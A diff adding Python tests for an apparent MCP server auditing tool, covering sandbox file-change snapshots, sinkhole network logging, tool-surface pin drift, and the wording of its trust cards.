+        ("list_notes", "Tool removed since the pin.")
+    ]
+
+
+def test_cli_never_overwrites_the_pin_it_compares_against(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    tools = [ToolInfo(name="list_notes", description="List notes.", input_schema={"type": "object"})]
+    obs = observation([Phase(name="startup")])
+    out = tmp_path / "out"
+    out.mkdir()
+    baseline = out / "pin.json"
+    original = build_pin(resolution(), obs, tools).model_dump_json(by_alias=True)
+    baseline.write_text(original)
+    drifted = build_pin(resolution(), obs, [ToolInfo(name="other", input_schema={"type": "object"})])
+
+    async def fake(*args: object) -> TrustResult:
+        return TrustResult(card=build_card(resolution(), obs, [], None), pin=drifted)
+
+    monkeypatch.setattr("mcp_audit.trust.cli.run_trust", fake)
+    result = CliRunner().invoke(main, ["trust", NAME, "--out", str(out), "--pin", str(baseline)])
+    assert result.exit_code == 0, result.output
+    assert baseline.read_text() == original
+    assert json.loads((out / "pin.new.json").read_text())["tools"][0]["name"] == "other"
+
+
+# Round-three review fixes ---------------------------------------------------------
+
+
+def test_tcp_connect_is_recorded_at_accept_and_enriched_later() -> None:
+    connect = {"kind": "tcp", "conn": 1, "dst_ip": "198.18.0.1", "dst_port": 443, "name": "api.example.test"}
+    detail = {"kind": "tcp_detail", "conn": 1, "sni": "api.example.test", "bytes": 517}
+    same, _, _ = parse_sink_log(
+        "\n".join(json.dumps(r | {"seq": i + 2}) for i, r in enumerate([connect, detail])), 0
+    )
+    assert [(e.kind, e.sni) for e in same] == [("tcp", "api.example.test")]
+    first, last, _ = parse_sink_log(json.dumps(connect | {"seq": 2}), 0)
+    later, _, _ = parse_sink_log(json.dumps(detail | {"seq": 3}), last)
+    assert [e.label() for e in first] == ["TCP connect api.example.test:443"] and later == []
+
+
+def test_sinkhole_emits_connect_before_reading() -> None:
+    source = Path(sinkhole_agent.__file__).read_text()
+    handler = source[source.index("class TcpSink") : source.index("class DnsSink")]
+    assert handler.index("emit(opened)") < handler.index("sock.recv(")
+
+
+async def test_rewrite_without_earlier_stat_is_unchecked_not_moved(monkeypatch: pytest.MonkeyPatch) -> None:
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, "A /scratch/db\n"), (0, "A /scratch/db\n")],
+            "exec": [(1, ""), (0, "regular file\t9\t2026-01-01 00:00:09\t/scratch/db\n")],
+            "logs": [(0, ""), (0, "")],
+            "inspect": [(0, "true"), (0, "true")],
+        },
+    )
+    await sandbox.snapshot()
+    record = await sandbox.snapshot()
+    assert record.changes == [] and not record.rewrites_checked
+
+
+async def test_outside_home_write_survives_truncation(monkeypatch: pytest.MonkeyPatch) -> None:
+    listing = "".join(f"A /scratch/f{i:04d}\n" for i in range(250)) + "A /tmp/outside\n"
+    stats = "".join(f"regular file\t1\t2026-01-01 00:00:00\t/scratch/f{i:04d}\n" for i in range(250))
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, listing)],
+            "exec": [(0, stats + "regular file\t1\t2026-01-01 00:00:00\t/tmp/outside\n")],
+            "logs": [(0, "")],
+            "inspect": [(0, "true")],
+        },
+    )
+    record = await sandbox.snapshot()
+    assert record.changes[0].path == "/tmp/outside" and record.truncated == 51
+    phase = Phase(name="startup", file_changes=record.changes, file_changes_truncated=record.truncated)
+    card = build_card(resolution(), observation([phase]), [], None)
+    assert "TBC-WRITE-OUTSIDE-HOME" in {m.rule for m in card.mismatches}
+    writes = next(s for s in card.suggestions if s.title == "Filesystem writes").body
+    assert "list truncated" in writes and "nothing else was written" not in writes
+
+
+def test_missing_registry_status_is_unknown_not_fail() -> None:
+    routes = registry_routes(server_json())
+    key = next(k for k in routes if "/versions/" in k)
+    routes[key] = {"server": server_json()}
+    resolution = Resolver(FakeFetch(routes), REGISTRY).resolve(NAME)
+    assert statuses(resolution)["registry.status"] == "unknown"
+    card = build_card(resolution, Observation(mode="none", status="skipped"), [], None)
+    assert not any("status" in m.summary for m in card.mismatches)
+
+
+def test_shutdown_egress_wording() -> None:
+    events = [NetworkEvent(kind="tcp", host="t.example.test", port=443)]
+    card = build_card(resolution(), observation([Phase(name="shutdown", network=events)]), [], None)
+    summary = next(m.summary for m in card.mismatches if m.rule == "TBC-UNPROMPTED-NET")
+    assert "after the session ended" in summary and "before any tool" not in summary
+
+
+# Round-four review fixes ----------------------------------------------------------
+
+
+async def test_installer_inputs_never_reach_the_run_image_env(monkeypatch: pytest.MonkeyPatch) -> None:
+    meta = 'MCPAUDIT_META={"version": "1.2.3", "bin": "cli.js"}'
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {"run": [(0, meta)], "commit": [(0, "")], "rm": [(0, "")], "image": [(0, "")]},
+    )
+    prepared = await sandbox.prepare(PackageRef(registry_type="npm", identifier="notes-mcp", version="1.2.3"))
+    assert prepared.command == ["/srv/node_modules/.bin/notes-mcp"] and prepared.version == "1.2.3"
+    docker = sandbox.docker
+    assert isinstance(docker, FakeDocker)
+    install = next(call for call in docker.calls if call[0] == "run")
+    assert "--env" not in install and not any(arg.startswith("MCPAUDIT_") for arg in install)
+    assert install[-4:-2] == ("notes-mcp@1.2.3", "notes-mcp")
+
+
+async def test_unparsable_attestation_does_not_fail_the_session(monkeypatch: pytest.MonkeyPatch) -> None:
+    sandbox = fake_sandbox(monkeypatch, {"inspect": [(0, "unexpected")]})
+    assert await sandbox.attest() == ["Server container settings could not be parsed."]
+
+
+def test_pin_from_another_server_is_not_compared() -> None:
+    tools = [ToolInfo(name="list_notes", description="List.", input_schema={"type": "object"})]
+    mine = build_pin(resolution(), observation([]), tools)
+    other = mine.model_copy(update={"server_name": "io.github.someone/else", "surface_sha256": "x"})
+    drift = compare_pin(other, mine)
+    assert [(m.rule, m.severity) for m in drift] == [("TBC-PIN-OTHER-SERVER", "info")]
+
+
+def test_remote_egress_line_uses_the_endpoint_port() -> None:
+    from mcp_audit.trust.models import RemoteRef
+
+    res = Resolution(input="x", kind="url", remote=RemoteRef(type="x", url="http://127.0.0.1:8080/mcp"))
+    card = build_card(res, Observation(mode="outside", status="complete"), [], None)
+    egress = next(s for s in card.suggestions if s.title == "Network egress").body
+    assert egress.startswith("allow 127.0.0.1:8080")
+
+
+def test_trust_is_marked_experimental_with_its_limits() -> None:
+    result = CliRunner().invoke(main, ["trust", "--help"])
+    assert result.exit_code == 0
+    assert "(experimental)" in result.output and "only listed" in result.output.replace("\n", " ")
+    listing = CliRunner().invoke(main, ["--help"]).output
+    assert "Experimental: check a server in a sandbox" in listing
+    guide = (Path(__file__).parents[1] / "docs" / "guides" / "trust-before-connect.md").read_text()
+    assert guide.splitlines()[2].startswith("> **Experimental.**") and "observed from outside only" in guide
